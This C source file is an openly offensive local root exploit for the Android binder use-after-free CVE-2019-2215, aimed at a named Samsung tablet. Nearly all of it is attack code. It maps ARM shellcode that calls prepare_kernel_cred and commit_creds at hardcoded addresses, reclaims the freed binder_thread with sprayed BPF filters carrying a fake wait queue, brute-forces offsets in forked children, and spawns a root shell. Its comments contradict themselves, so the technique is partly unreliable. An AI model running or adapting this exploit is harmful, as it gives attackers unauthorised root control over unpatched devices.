/*
 * cve_2019_2215_bpf.c — CVE-2019-2215 exploit using BPF filter spray
 *
 * Key insight: SO_ATTACH_FILTER with 22-26 BPF instructions allocates
 * persistently in kmalloc-256 (same cache as binder_thread). The BPF
 * instruction data is controllable — we embed our fake wait_queue_head
 * inside the BPF filter payload.
 *
 * Exploit flow:
 * 1. Map shellcode at fixed addr (no KASLR, no PXN)
 * 2. Create fake wait_queue_entry in userspace
 * 3. Open binder + epoll ADD → creates binder_thread in kmalloc-256
 * 4. BINDER_THREAD_EXIT → frees binder_thread (UAF!)
 * 5. Spray BPF filters (22-26 insns) → reclaim freed kmalloc-256 slot
 *    BPF data contains fake wait_queue_head at every possible offset
 * 6. close(epfd) → ep_free → ep_unregister_pollwait →
 *    remove_wait_queue → list_del on our controlled data
 *    OR: triggers wake_up on stale waitqueue → calls our function pointer
 *
 * Actually, closing the epoll fd calls ep_free which:
 * - For each file being monitored: ep_unregister_pollwait
 * - ep_unregister_pollwait walks the poll wait queue and removes entries
 * - The wait queue traversal calls list_for_each_entry_safe + list_del
 * - If we control the list pointers, list_del writes to our addresses
 * - More importantly: ep_remove also calls wake_up_locked on the wait queue
 *   NO — actually it calls list_del_init on the eppoll_entry's wait list
 *
 * The actual UAF trigger path for function pointer call:
 * - Something writes to the binder fd → binder_poll is called
 * - binder_poll calls poll_wait → accesses thread->wait
 * - Thread->wait has our fake data → ???
 *
 * Actually, the correct path is:
 * - ep_unregister_pollwait → for each pwq entry, calls remove_wait_queue
 * - remove_wait_queue does list_del on the wait_queue_entry
 * - This is a WRITE primitive (writes prev/next pointers)
 *
 * For FUNCTION POINTER execution, we need wake_up to be called on the
 * freed thread's wait queue. This happens when:
 * - Another thread does a binder transaction targeting our process
 * - OR we trigger poll on the binder fd
 *
 * Revised approach:
 * - Use epoll_ctl DEL as write primitive (list_del)
 * - The list_del overwrites bytes in the BPF filter data
 * - Check which bytes changed → reveals wait_queue_head offset
 * - Then build targeted exploit with correct offset
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

#define NUM_SPRAY 200
#define BPF_INSNS 26  /* 26 insns → ~224 bytes → kmalloc-256 */

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name)) {
            val = a; break;
        }
    }
    fclose(f);
    return val;
}

/*
 * Phase 1: Determine the exact wait_queue_head_t offset
 *
 * Strategy: create UAF, spray BPF filters with known pattern,
 * trigger list_del via epoll_ctl DEL, then read BPF filter back
 * to see which bytes were modified.
 *
 * Problem: we can't read BPF filter data back from the socket.
 * Alternative: use recvmsg on the socket and check if the filter
 * behavior changed (BPF instructions corrupted → filter drops/accepts
 * different packets).
 *
 * Even simpler: spray with MULTIPLE BPF filters. After list_del,
 * close all sockets. If list_del corrupted a BPF refcount or function
 * pointer, the close might crash. Monitor for crashes.
 *
 * Simplest: just try the exploit at different offsets in forked children.
 * The BPF spray payload embeds a fake wait_queue_head at the target offset.
 */

/*
 * Build a BPF filter where specific instruction slots encode our payload.
 *
 * struct sk_filter on ARM32 kernel 3.10:
 *   offset 0:  atomic_t refcnt (4 bytes)
 *   offset 4:  unsigned int len (4 bytes) — number of instructions
 *   offset 8:  struct rcu_head rcu (8 bytes)
 *   offset 16: unsigned int (*bpf_func)(...) (4 bytes) — function pointer!
 *   offset 20: union { struct sock_filter insns[0]; ... }
 *
 * Our BPF instructions start at offset 20 in the kmalloc'd buffer.
 * Each instruction is 8 bytes.
 *
 * So byte offset B in the binder_thread maps to:
 *   If B < 20: in the sk_filter header (can't control)
 *   If B >= 20: in insns[(B-20)/8] at field ((B-20)%8)
 *
 * wait_queue_head_t at offset W in the object:
 *   W+0: spinlock_t lock (4 bytes) — must be 0 (unlocked)
 *   W+4: task_list.next (4 bytes) — must point to fake wait_queue_entry
 *   W+8: task_list.prev (4 bytes) — must point to fake wait_queue_entry
 *
 * For wake_up to call our function:
 *   The task_list forms a circular list of wait_queue_entry structs
 *   Each entry has: flags(4), private(4), func(4), task_list(8)
 *   wake_up calls entry->func(entry, mode, flags, key)
 */

/* Map shellcode + fake wait_queue_entry at fixed address */
static void *setup_shellcode(void) {
    void *page = mmap((void*)0x42000000, 4096,
                      PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (page == MAP_FAILED) { perror("shellcode mmap"); return NULL; }

    /* ARM32 shellcode at 0x42000000 */
    uint32_t sc[] = {
        0xe92d4010,  /* push {r4, lr} */
        0xe3a00000,  /* mov r0, #0 */
        0xe59f4010,  /* ldr r4, [pc, #16] → prepare_kernel_cred */
        0xe12fff34,  /* blx r4 */
        0xe59f4008,  /* ldr r4, [pc, #8] → commit_creds */
        0xe12fff34,  /* blx r4 */
        0xe3a00000,  /* mov r0, #0 */
        0xe8bd8010,  /* pop {r4, pc} */
        PREPARE_KERNEL_CRED,
        COMMIT_CREDS,
    };
    memcpy(page, sc, sizeof(sc));

    /* Fake wait_queue_entry at 0x42000200 */
    uint32_t *fake = (uint32_t*)((char*)page + 0x200);
    fake[0] = 0;                     /* flags */
    fake[1] = 0;                     /* private (task_struct) */
    fake[2] = 0x42000000;            /* func → shellcode */
    /* task_list: next/prev point to self to terminate iteration */
    fake[3] = (uint32_t)&fake[3];    /* task_list.next = &self.next */
    fake[4] = (uint32_t)&fake[3];    /* task_list.prev = &self.next */

    return page;
}

/*
 * Build BPF instruction array that encodes desired bytes at specific
 * offsets within the kmalloc-256 buffer.
 *
 * sk_filter header is 20 bytes (refcnt, len, rcu, bpf_func).
 * Instructions start at byte 20.
 * Target: place wait_queue_head data at byte offset `wait_off`.
 *
 * wait_off+0: lock = 0x00000000
 * wait_off+4: next = 0x42000200 (fake entry)
 * wait_off+8: prev = 0x42000200 (fake entry)
 */
static void build_bpf_payload(struct sock_filter *insns, int ninsns,
                              int wait_off) {
    /* Default: all BPF_RET 0xFFFF (accept all) */
    for (int i = 0; i < ninsns; i++) {
        insns[i] = (struct sock_filter){BPF_RET | BPF_K, 0, 0, 0xFFFF};
    }

    /* Overlay our payload starting at byte offset wait_off.
     * Each instruction is at bytes 20 + i*8 in the kmalloc buffer.
     * We need to set bytes at wait_off, wait_off+4, wait_off+8.
     *
     * BPF instruction layout (8 bytes):
     *   u16 code;    // offset 0
     *   u8  jt;      // offset 2
     *   u8  jf;      // offset 3
     *   u32 k;       // offset 4
     */

    /* Helper: write a 32-bit value at absolute byte offset in the buffer */
    uint8_t buf[256];
    memset(buf, 0, sizeof(buf));

    /* First, write the default instruction data */
    for (int i = 0; i < ninsns; i++) {
        int off = 20 + i * 8;
        *(uint16_t*)(buf + off) = insns[i].code;
        buf[off + 2] = insns[i].jt;
        buf[off + 3] = insns[i].jf;
        *(uint32_t*)(buf + off + 4) = insns[i].k;
    }

    /* Write wait_queue_head payload */
    if (wait_off + 12 <= 20 + ninsns * 8) {
        *(uint32_t*)(buf + wait_off + 0) = 0x00000000;  /* lock = unlocked */
        *(uint32_t*)(buf + wait_off + 4) = 0x42000200;  /* next → fake entry */
        *(uint32_t*)(buf + wait_off + 8) = 0x42000200;  /* prev → fake entry */
    }

    /* Read back as BPF instructions */
    for (int i = 0; i < ninsns; i++) {
        int off = 20 + i * 8;
        insns[i].code = *(uint16_t*)(buf + off);
        insns[i].jt = buf[off + 2];
        insns[i].jf = buf[off + 3];
        insns[i].k = *(uint32_t*)(buf + off + 4);
    }

    /* Ensure last instruction is BPF_RET (required by verifier) */
    insns[ninsns - 1] = (struct sock_filter){BPF_RET | BPF_K, 0, 0, 0xFFFF};
}

static int try_exploit(int wait_off) {
    printf("\n[*] Offset %d: ", wait_off);
    fflush(stdout);

    void *sc = setup_shellcode();
    if (!sc) return -1;

    /* Pin to CPU 0 for SLUB locality */
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    /* Open binder + epoll → creates binder_thread */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) { perror("binder"); return -1; }
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    uint32_t z = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* FREE binder_thread */
    int32_t dummy = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

    /* SPRAY: BPF filters to reclaim freed kmalloc-256 slot */
    int spray_socks[NUM_SPRAY];
    struct sock_filter insns[BPF_INSNS];
    build_bpf_payload(insns, BPF_INSNS, wait_off);

    struct sock_fprog fprog = { .len = BPF_INSNS, .filter = insns };

    int sprayed = 0;
    for (int i = 0; i < NUM_SPRAY; i++) {
        spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_socks[i] < 0) break;
        if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                      &fprog, sizeof(fprog)) < 0) {
            close(spray_socks[i]);
            break;
        }
        sprayed++;
    }

    uid_t before = getuid();

    /* TRIGGER: close epoll → ep_free → accesses freed binder_thread's wait queue */
    close(epfd);

    uid_t after = getuid();

    if (after == 0) {
        printf("*** ROOT! uid=%d→%d ***\n", before, after);
        /* Cleanup spray */
        for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
        close(bfd);
        printf("[!] Spawning shell...\n");
        system("id");
        system("/system/bin/sh");
        return 0;
    }

    printf("no root (uid=%d, sprayed=%d)", after, sprayed);

    /* Cleanup */
    for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
    close(bfd);
    munmap(sc, 4096);

    return -1;
}

int main(void) {
    printf("=== CVE-2019-2215 Exploit (BPF spray) ===\n");
    printf("Target: SM-T377A, kernel 3.10.9, patch 2017-07\n");
    printf("PID=%d UID=%d\n", getpid(), getuid());
    printf("Shellcode: 0x42000000, Fake entry: 0x42000200\n");
    printf("BPF insns: %d (data starts at sk_filter+20)\n\n", BPF_INSNS);

    /* Try offsets from 20 to 200 in steps of 4 */
    /* sk_filter header is 20 bytes, so wait_queue_head can't be before 20 */
    /* Actually, binder_thread and sk_filter are DIFFERENT objects —
     * the wait_queue_head offset is in the binder_thread struct,
     * and our BPF data overlays it at the same bytes in memory.
     * So we need to try offsets relative to the start of the kmalloc-256 block. */
    int offsets[] = {
        /* Likely range for binder_thread wait_queue_head */
        36, 40, 44, 48, 52, 56, 60, 64, 68, 72,
        76, 80, 84, 88, 92, 96, 100, 104, 108, 112,
        116, 120, 124, 128, 132, 136, 140, 144, 148, 152,
        156, 160, 164, 168, 172, 176, 180, 184, 188, 192,
        196, 200, 204, 208, 212, 216, 220, 224
    };
    int noffsets = sizeof(offsets) / sizeof(offsets[0]);

    for (int i = 0; i < noffsets; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int r = try_exploit(offsets[i]);
            _exit(r == 0 ? 42 : 0);
        }
        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status)) {
            if (WEXITSTATUS(status) == 42) {
                printf("\n\n[!!!] ROOT AT OFFSET %d!\n", offsets[i]);
                try_exploit(offsets[i]);
                return 0;
            }
        } else if (WIFSIGNALED(status)) {
            printf(" *** CRASH sig=%d — UAF HIT! ***", WTERMSIG(status));
        }
        printf("\n");
    }

    printf("\n--- dmesg ---\n"); fflush(stdout);
    system("dmesg 2>/dev/null | tail -20 | grep -iE 'oops|bug|panic|fault|binder|Backtrace|Unable|PC.is' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
